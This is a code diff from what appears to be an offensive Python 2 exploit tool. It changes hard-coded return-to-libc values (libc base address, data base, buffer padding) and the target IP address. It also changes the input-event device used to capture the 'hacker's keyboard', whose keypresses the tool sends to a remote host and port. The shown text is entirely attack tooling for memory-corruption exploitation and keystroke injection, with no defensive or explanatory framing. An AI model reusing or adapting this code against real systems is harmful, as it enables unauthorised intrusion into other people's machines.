@@ -143,7 +143,7 @@ def send_keypresses():
         if ctr == 4:
             ctr = 0
         for i in range(0, ctr):
-            keys.append('ESC')
+            keys.append('END')
         print keys
         write_file(text=keys,ip_addr=generator.ip_addr, port_no=generator.port_no)
         keys = []
@@ -170,14 +170,14 @@ def main():
     g.init(sys.argv[len(sys.argv)-1])
 
     # Hard-coded values
-    generator.libc_base = '0xb7e17000'
-    generator.data_base = '0x0804b080'
+    generator.libc_base = '0xb7e20000'
+    generator.data_base = '0x0804b068'
     generator.padding = 133
     generator.write_code = True
     generator.file_name = 'src/simple_client.c'
     generator.line_num = 11
     # Create two members for the object so that the ip_addr and port_no can be accessed anywhere
-    generator.ip_addr = '192.168.1.3'
+    generator.ip_addr = '192.168.43.234'
     generator.port_no = '10000'
 
     # generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
@@ -194,7 +194,7 @@ def main():
     open_file(file_name='/dev/input/event' + sys.argv[1])
 
     # This event number should be the hacker's keyboard event number
-    proc = subprocess.Popen(['evtest', '/dev/input/event3'], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['evtest', '/dev/input/event1'], stdout=subprocess.PIPE)
     expr = re.compile(r'Event: time [0-9]*\.[0-9]*, type [0-9]+ \(EV_KEY\), code ([0-9]+) \(KEY_([A-Z0-9]+)\), value 1')
     keys = []
     send_keypresses()
